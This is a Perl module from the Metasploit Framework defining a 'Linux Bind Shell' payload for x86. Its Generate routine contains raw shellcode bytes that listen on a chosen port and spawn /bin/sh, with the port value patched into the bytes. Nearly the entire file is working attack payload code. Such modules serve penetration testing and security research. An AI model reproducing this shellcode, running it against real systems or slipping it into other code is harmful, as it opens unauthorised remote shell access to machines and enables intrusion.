
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_ia32_bind;
use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
	'Name'         => 'Linux Bind Shell',
	'Version'      => '$Revision$',
	'Description'  => 'Listen for connection and spawn a shell',
	'Authors'      => [ 'skape <miller [at] hick.org>', 
							 'vlad902 <vlad902 [at] gmail.com>' ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'linux' ],
	'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	my $self = $class->SUPER::new($hash, @_);

	$self->_Info->{'Size'} = $self->_GenSize;
	return($self);
}

sub Build 
{
	my $self = shift;
	return($self->Generate($self->GetVar('LPORT')));
}

sub Generate 
{
	my $self = shift;
	my $port = shift;
	my $off_port = 0x14;
	my $port_bin = pack('n', $port);

	my $shellcode =
		"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96" .
		"\x43\x52\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56" .
		"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1" .
		"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0" .
		"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" .
		"\x89\xe1\xcd\x80";

	substr($shellcode, $off_port, 2, $port_bin);

	return($shellcode);
}

sub _GenSize 
{
	my $self = shift;
	my $bin = $self->Generate('4444');
	return(length($bin));
}

1;
